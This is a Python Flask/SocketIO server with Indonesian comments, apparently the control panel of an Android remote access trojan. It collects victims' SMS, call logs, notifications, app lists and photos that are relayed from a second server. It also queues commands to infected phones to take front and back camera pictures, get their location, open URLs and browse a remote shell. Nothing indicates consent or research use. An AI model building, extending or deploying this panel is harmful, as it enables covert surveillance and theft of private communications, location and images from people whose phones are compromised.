#!/usr/bin/env python3
from flask import Flask, render_template, jsonify, request, send_file
from flask_socketio import SocketIO, emit
import json
import os
import base64
from datetime import datetime
import threading
import logging
from queue import Queue
import requests

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
socketio = SocketIO(app, cors_allowed_origins="*")

# --- Konfigurasi ---
FLASK_PORT = int(os.environ.get('FLASK_PORT', 9191))
SERVER1_URL = os.environ.get('SERVER1_URL', 'http://localhost:9090')  # URL untuk kirim command ke server1

# --- Global Variables ---
connected_devices = {}  # Menyimpan info device yang terkoneksi
device_data_queues = {}  # Queue untuk data per device
current_device = None  # Device yang sedang dipilih
command_queue = Queue()  # Queue untuk command ke server1

# --- Setup Logging ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Directory Setup ---
for dir_name in ['web_downloads', 'web_images', 'web_recordings']:
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)

# ==================== ROUTES ====================

@app.route('/')
def index():
    """Halaman utama dengan animasi loading"""
    return render_template('index.html')

@app.route('/api/devices')
def get_devices():
    """Endpoint untuk mendapatkan list device yang terkoneksi"""
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'android_version': info.get('android_version', 'Unknown'),
            'battery': info.get('battery', 'Unknown'),
            'last_seen': info.get('last_seen', datetime.now().isoformat()),
            'ip': info.get('ip', 'Unknown')
        })
    return jsonify({'devices': devices_list})

@app.route('/api/select_device', methods=['POST'])
def select_device():
    """Memilih device untuk dikontrol"""
    global current_device
    data = request.json
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        return jsonify({
            'status': 'success',
            'device': connected_devices[device_id]
        })
    return jsonify({'status': 'error', 'message': 'Device not found'}), 404

@app.route('/api/device_info')
def get_device_info():
    """Mendapatkan info device yang sedang dipilih"""
    if current_device and current_device in connected_devices:
        return jsonify(connected_devices[current_device])
    return jsonify({'status': 'error', 'message': 'No device selected'}), 400

@app.route('/api/command', methods=['POST'])
def send_command():
    """Mengirim command ke device melalui server1"""
    if not current_device:
        return jsonify({'status': 'error', 'message': 'No device selected'}), 400
    
    data = request.json
    command = data.get('command')
    params = data.get('params', {})
    
    # Format command sesuai dengan yang dimengerti server1
    cmd_str = format_command(command, params)
    
    # Kirim ke server1 (implementasi sesuai kebutuhan)
    # Misal: forward ke server1 via HTTP atau queue
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str
    })
    
    logger.info(f"Command sent: {cmd_str} to device {current_device}")
    
    return jsonify({
        'status': 'success',
        'command': cmd_str
    })

@app.route('/api/data', methods=['POST'])
def receive_data():
    """Endpoint untuk menerima data dari server1.py"""
    data = request.json
    data_type = data.get('type')
    payload = data.get('payload')
    client_info = data.get('client_info', {})
    
    # Generate device ID dari IP atau info unik
    device_id = client_info.get('address', 'unknown')
    
    # Update atau tambah device
    if data_type == 'DEVICE_INFO':
        connected_devices[device_id] = {
            'id': device_id,
            'ip': client_info.get('address'),
            'model': payload.get('Model'),
            'manufacturer': payload.get('Manufacturer'),
            'android_version': payload.get('AndroidVersion'),
            'battery': payload.get('Battery'),
            'last_seen': datetime.now().isoformat(),
            'connected': True
        }
        # Broadcast ke semua client web
        socketio.emit('device_connected', connected_devices[device_id])
    
    # Simpan data ke queue per device
    if device_id not in device_data_queues:
        device_data_queues[device_id] = []
    
    device_data_queues[device_id].append({
        'type': data_type,
        'payload': payload,
        'timestamp': datetime.now().isoformat()
    })
    
    # Broadcast realtime ke web client jika device ini sedang dipilih
    if current_device == device_id:
        socketio.emit('device_data', {
            'type': data_type,
            'payload': payload,
            'timestamp': datetime.now().isoformat()
        })
    
    # Handle specific data types
    if data_type == 'SMS':
        socketio.emit('new_sms', payload)
    elif data_type == 'CALL':
        socketio.emit('new_call', payload)
    elif data_type == 'NOTIFICATION':
        socketio.emit('new_notification', payload)
    elif data_type == 'IMAGE':
        # Simpan image untuk diakses via URL
        save_image_for_web(payload, device_id)
    
    return jsonify({'status': 'ok'})

@app.route('/api/sms_logs')
def get_sms_logs():
    """Mendapatkan SMS logs untuk device yang dipilih"""
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in device_data_queues[current_device]:
            if item['type'] == 'SMS':
                logs.append(item['payload'])
    
    return jsonify(logs[-50:])  # Return 50 sms terakhir

@app.route('/api/call_logs')
def get_call_logs():
    """Mendapatkan Call logs"""
    if not current_device:
        return jsonify([])
    
    logs = []
    if current_device in device_data_queues:
        for item in device_data_queues[current_device]:
            if item['type'] == 'CALL':
                logs.append(item['payload'])
    
    return jsonify(logs[-50:])

@app.route('/api/apps')
def get_apps():
    """Mendapatkan list aplikasi"""
    if not current_device:
        return jsonify([])
    
    apps = []
    if current_device in device_data_queues:
        for item in device_data_queues[current_device]:
            if item['type'] == 'APP_LIST':
                apps = item['payload'].get('apps', [])
    
    return jsonify(apps)

@app.route('/api/image/<filename>')
def get_image(filename):
    """Mengambil image yang sudah disimpan"""
    return send_file(os.path.join('web_images', filename))

@app.route('/api/shell_result')
def get_shell_result():
    """Mendapatkan hasil shell command"""
    if not current_device:
        return jsonify([])
    
    results = []
    if current_device in device_data_queues:
        for item in reversed(device_data_queues[current_device]):
            if item['type'] in ['SHELL_LS_RESULT', 'FILE_MANAGER_RESULT']:
                results.append(item['payload'])
                if len(results) >= 10:
                    break
    
    return jsonify(results)

# ==================== Helper Functions ====================

def format_command(cmd, params):
    """Format command sesuai dengan format server1"""
    if cmd == 'run':
        return f"run {params.get('package')}"
    elif cmd == 'open':
        return f"open {params.get('url')}"
    elif cmd == 'toast':
        return f"toast {params.get('action')} {params.get('text')}"
    elif cmd == 'shell':
        return "shell"
    elif cmd == 'getsms':
        return "getsms"
    elif cmd == 'getcalllogs':
        return "getcalllogs"
    elif cmd == 'list_app':
        return "list_app"
    elif cmd == 'get_location':
        return "get_location"
    elif cmd == 'takefrontpic':
        return "takefrontpic"
    elif cmd == 'takebackpic':
        return "takebackpic"
    elif cmd == 'flashon':
        return "flashon"
    elif cmd == 'flashoff':
        return "flashoff"
    elif cmd == 'notifikasi':
        return "notifikasi"
    elif cmd == 'deviceinfo':
        return "deviceinfo"
    elif cmd == 'shell_cd':
        return f"cd {params.get('path')}"
    elif cmd == 'shell_ls':
        return "ls"
    elif cmd == 'shell_exit':
        return "exit_shell"
    else:
        return cmd

def save_image_for_web(image_data, device_id):
    """Menyimpan image untuk diakses via web"""
    try:
        filename = image_data.get('filename', f"img_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        filepath = os.path.join('web_images', f"{device_id}_{filename}")
        
        with open(filepath, 'wb') as f:
            f.write(base64.b64decode(image_data.get('image_base64', '')))
        
        # Broadcast ke web client
        socketio.emit('new_image', {
            'filename': filename,
            'url': f'/api/image/{device_id}_{filename}',
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        logger.error(f"Error saving image: {e}")

# ==================== SocketIO Events ====================

@socketio.on('connect')
def handle_connect():
    logger.info(f"Web client connected: {request.sid}")
    emit('connected', {'status': 'ok'})

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Web client disconnected: {request.sid}")

@socketio.on('request_devices')
def handle_request_devices():
    """Client web request list devices"""
    devices_list = []
    for device_id, info in connected_devices.items():
        devices_list.append({
            'id': device_id,
            'model': info.get('model', 'Unknown'),
            'manufacturer': info.get('manufacturer', 'Unknown'),
            'battery': info.get('battery', 'Unknown')
        })
    emit('devices_list', devices_list)

@socketio.on('select_device')
def handle_select_device(data):
    """Client web memilih device"""
    global current_device
    device_id = data.get('device_id')
    
    if device_id in connected_devices:
        current_device = device_id
        emit('device_selected', connected_devices[device_id])
        logger.info(f"Device selected: {device_id}")

@socketio.on('web_command')
def handle_web_command(data):
    """Menerima command dari web client"""
    if not current_device:
        emit('command_error', {'message': 'No device selected'})
        return
    
    cmd = data.get('command')
    params = data.get('params', {})
    
    cmd_str = format_command(cmd, params)
    command_queue.put({
        'device_id': current_device,
        'command': cmd_str
    })
    
    emit('command_sent', {'command': cmd_str})

# ==================== Background Thread ====================

def command_processor():
    """Thread untuk memproses command queue dan mengirim ke server1"""
    while True:
        try:
            if not command_queue.empty():
                cmd_data = command_queue.get()
                # Implementasi pengiriman ke server1
                # Bisa via HTTP atau socket
                logger.info(f"Processing command: {cmd_data}")
                
                # TODO: Implement actual sending to server1
                # Misal: requests.post(f"{SERVER1_URL}/command", json=cmd_data)
                
        except Exception as e:
            logger.error(f"Command processor error: {e}")
        
        threading.Event().wait(0.1)

# Start background thread
threading.Thread(target=command_processor, daemon=True).start()

if __name__ == '__main__':
    logger.info(f"Starting Flask server on port {FLASK_PORT}")
    socketio.run(app, host='0.0.0.0', port=FLASK_PORT, debug=False)
